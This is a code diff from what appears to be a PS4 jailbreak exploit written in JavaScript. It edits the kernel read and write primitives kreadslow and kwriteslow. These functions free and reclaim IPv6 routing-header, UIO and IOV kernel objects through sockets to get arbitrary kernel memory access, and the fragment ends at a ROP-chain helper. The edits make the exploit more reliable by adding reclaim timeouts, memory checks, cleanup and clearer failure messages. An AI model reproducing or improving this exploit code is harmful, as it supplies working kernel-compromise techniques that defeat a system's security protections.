@@ -1671,7 +1671,6 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   write64(uio.add(0x38), size);             // iov_len
 }
 var KREAD_MAX_KQ = 10000; // بدل 10000 الهاردكود
-
 function kreadslow(addr, size) {
   debug('Enter kreadslow addr: ' + hex(addr) + ' size: ' + size);
 
@@ -1686,9 +1685,9 @@ function kreadslow(addr, size) {
       debugging.info.memory &&
       debugging.info.memory.available === 0) {
 
-      log('kreadslow - Memory exhausted before start');
-      cleanup();
-      return BigInt_Error;
+    log('kreadslow: memory exhausted before start — please reboot your PS4 and try again.');
+    cleanup(true);
+    return BigInt_Error;
   }
   debug('kreadslow - Preparing buffers...');
 
@@ -1697,7 +1696,7 @@ function kreadslow(addr, size) {
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     leak_buffers[i] = malloc(size);
     if (!leak_buffers[i]) {
-      log('kreadslow - malloc leak_buffers[' + i + '] failed');
+      log('kreadslow: malloc leak_buffers[' + i + '] failed');
       return BigInt_Error;
     }
   }
@@ -1713,9 +1712,9 @@ function kreadslow(addr, size) {
   write64(uioIovRead.add(0x08), size);
   debug('kreadslow - Freeing triplets[1]=' + triplets[1]);
 
-  // تأكيد صلاحية triplets[1]
+  // Validate triplets[1]
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
-    log('kreadslow - invalid triplets[1]');
+    log('kreadslow: invalid triplets[1]');
     return BigInt_Error;
   }
 
@@ -1724,28 +1723,31 @@ function kreadslow(addr, size) {
 
   // Minimize footprint
   var uio_leak_add = leak_rthdr.add(0x08);
-  debug('kreadslow - Starting uio reclaim loop...');
+  debug('kreadslow - Starting UIO reclaim loop...');
   var count = 0;
   var zeroMemoryCount = 0;
 
   // Reclaim with uio.
   while (count < KREAD_MAX_KQ) {
     if (typeof debugging !== 'undefined' &&
-      debugging.info &&
-      debugging.info.memory &&
-      debugging.info.memory.available === 0) {
+        debugging.info &&
+        debugging.info.memory &&
+        debugging.info.memory.available === 0) {
+
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
-        log(' Jailbreak failed!');
-        cleanup();
+        log('kreadslow: memory exhausted during UIO reclaim — please reboot your PS4 and try again.');
+        cleanup(true);
         return BigInt_Error;
       }
+
     } else {
       zeroMemoryCount = 0;
     }
+
     count++;
     if (count % 100 === 1) {
-      debug('kreadslow - uio loop iter ' + count);
+      debug('kreadslow - UIO loop iter ' + count);
     }
 
     trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
@@ -1769,11 +1771,12 @@ function kreadslow(addr, size) {
   }
 
   if (count >= KREAD_MAX_KQ) {
-    debug('kreadslow - Failed uio reclaim after ' + count + ' iterations');
+    log('kreadslow: UIO reclaim timeout — please reboot your PS4 and try again.');
+    cleanup(true);
     return BigInt_Error;
   }
 
-  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations');
+  debug('kreadslow - UIO reclaim succeeded after ' + count + ' iterations');
   var uio_iov = read64(leak_rthdr);
   debug('kreadslow - uio_iov: ' + hex(uio_iov));
 
@@ -1781,9 +1784,9 @@ function kreadslow(addr, size) {
   build_uio(msgIov, uio_iov, 0, true, addr, size);
   debug('kreadslow - Freeing triplets[2]=' + triplets[2]);
 
-  // تأكيد صلاحية triplets[2]
+  // Validate triplets[2]
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
-    log('kreadslow - invalid triplets[2]');
+    log('kreadslow: invalid triplets[2]');
     return BigInt_Error;
   }
 
@@ -1792,27 +1795,34 @@ function kreadslow(addr, size) {
 
   // Minimize footprint
   var iov_leak_add = leak_rthdr.add(0x20);
-  debug('kreadslow - Starting iov reclaim loop...');
+  debug('kreadslow - Starting IOV reclaim loop...');
 
   // Reclaim uio with iov.
   var zeroMemoryCount2 = 0;
   var count2 = 0;
   while (true) {
     count2++;
+
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
         debugging.info.memory.available === 0) {
 
-        zeroMemoryCount++;
-        if (zeroMemoryCount >= 5) {
-            log(' Jailbreak failed!');
-            cleanup();
-            return BigInt_Error;
-        }
+      zeroMemoryCount2++;
+      if (zeroMemoryCount2 >= 5) {
+        log('kreadslow: memory exhausted during IOV reclaim — please reboot your PS4 and try again.');
+        cleanup(true);
+        return BigInt_Error;
+      }
 
     } else {
-        zeroMemoryCount = 0;
+      zeroMemoryCount2 = 0;
+    }
+
+    if (count2 >= 5000) {
+      log('kreadslow: IOV reclaim timeout — please reboot your PS4 and try again.');
+      cleanup(true);
+      return BigInt_Error;
     }
 
     // Reclaim with iov.
@@ -1822,7 +1832,7 @@ function kreadslow(addr, size) {
     // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations');
+      debug('kreadslow - IOV reclaim succeeded after ' + count2 + ' iterations');
       break;
     }
 
@@ -1862,9 +1872,10 @@ function kreadslow(addr, size) {
   write(new BigInt(iov_sock_1), tmp, 1);
 
   if (leak_buffer.eq(0)) {
-    debug('kreadslow - No valid leak found');
+    log('kreadslow: no valid leak found — reboot required.');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
+    cleanup(true);
     return BigInt_Error;
   }
 
@@ -1880,9 +1891,10 @@ function kreadslow(addr, size) {
 
   debug('kreadslow - triplets[2]=' + triplets[2]);
   if (triplets[2] === -1) {
-    debug('kreadslow - Failed to find triplets[2]');
+    log('kreadslow: failed to find triplets[2] — reboot required.');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
+    cleanup(true);
     return BigInt_Error;
   }
 
@@ -1895,7 +1907,7 @@ function kreadslow(addr, size) {
 function kwriteslow(addr, buffer, size) {
   debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size: ' + size);
 
-  // حراسة على المدخلات
+  // Input guards
   if (addr.eq(0) || size <= 0) {
     log('kwriteslow: invalid addr/size');
     return BigInt_Error;
@@ -1905,7 +1917,7 @@ function kwriteslow(addr, buffer, size) {
     return BigInt_Error;
   }
 
-  // تأكيد صلاحية triplets[1] و triplets[2] قبل الاستخدام
+  // Validate triplets
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
     log('kwriteslow: invalid triplets[1]');
     return BigInt_Error;
@@ -1930,21 +1942,29 @@ function kwriteslow(addr, buffer, size) {
 
   // Reclaim with uio.
   var zeroMemoryCount = 0;
+  var count = 0;
   while (true) {
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
         debugging.info.memory.available === 0) {
 
-        zeroMemoryCount++;
-        if (zeroMemoryCount >= 5) {
-            log(' Jailbreak failed!');
-            cleanup();
-            return BigInt_Error;
-        }
+      zeroMemoryCount++;
+      if (zeroMemoryCount >= 5) {
+        log('kwriteslow: memory exhausted during UIO reclaim — please reboot your PS4 and try again.');
+        cleanup(true);
+        return BigInt_Error;
+      }
 
     } else {
-        zeroMemoryCount = 0;
+      zeroMemoryCount = 0;
+    }
+
+    count++;
+    if (count >= 5000) {
+      log('kwriteslow: UIO reclaim timeout — please reboot your PS4 and try again.');
+      cleanup(true);
+      return BigInt_Error;
     }
 
     trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
@@ -1953,7 +1973,6 @@ function kwriteslow(addr, buffer, size) {
     // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
-      // debug("Break on reclaim with uio");
       break;
     }
 
@@ -1965,12 +1984,11 @@ function kwriteslow(addr, buffer, size) {
   }
 
   var uio_iov = read64(leak_rthdr);
-  // debug("This is uio_iov: " + hex(uio_iov));
 
   // Prepare uio reclaim buffer.
   build_uio(msgIov, uio_iov, 0, false, addr, size);
 
-  // تأكيد صلاحية triplets[2] قبل الـ free
+  // Validate triplets[2] before free
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
     log('kwriteslow: invalid triplets[2] before free');
     return BigInt_Error;
@@ -1984,21 +2002,29 @@ function kwriteslow(addr, buffer, size) {
 
   // Reclaim uio with iov.
   var zeroMemoryCount2 = 0;
+  var count2 = 0;
   while (true) {
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
         debugging.info.memory.available === 0) {
 
-        zeroMemoryCount++;
-        if (zeroMemoryCount >= 5) {
-            log(' Jailbreak failed!');
-            cleanup();
-            return BigInt_Error;
-        }
+      zeroMemoryCount2++;
+      if (zeroMemoryCount2 >= 5) {
+        log('kwriteslow: memory exhausted during IOV reclaim — please reboot your PS4 and try again.');
+        cleanup(true);
+        return BigInt_Error;
+      }
 
     } else {
-        zeroMemoryCount = 0;
+      zeroMemoryCount2 = 0;
+    }
+
+    count2++;
+    if (count2 >= 5000) {
+      log('kwriteslow: IOV reclaim timeout — please reboot your PS4 and try again.');
+      cleanup(true);
+      return BigInt_Error;
     }
 
     // Reclaim with iov.
@@ -2008,7 +2034,6 @@ function kwriteslow(addr, buffer, size) {
     // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      // debug("Break on reclaim uio with iov");
       break;
     }
 
@@ -2039,9 +2064,10 @@ function kwriteslow(addr, buffer, size) {
     sched_yield();
   }
   if (triplets[2] === -1) {
-    debug('kwriteslow - Failed to find triplets[2]');
+    log('kwriteslow: failed to find triplets[2] — reboot required.');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
+    cleanup(true);
     return BigInt_Error;
   }
 
@@ -2050,6 +2076,7 @@ function kwriteslow(addr, buffer, size) {
   read(new BigInt(iov_sock_0), tmp, 1);
   return new BigInt(0);
 }
+
 function rop_regen_and_loop(last_rop_entry, number_entries) {
   var new_rop_entry = last_rop_entry.add(8);
   var copy_entry = last_rop_entry.sub(number_entries * 8).add(8); // We add 8 to have the first ROP instruction add
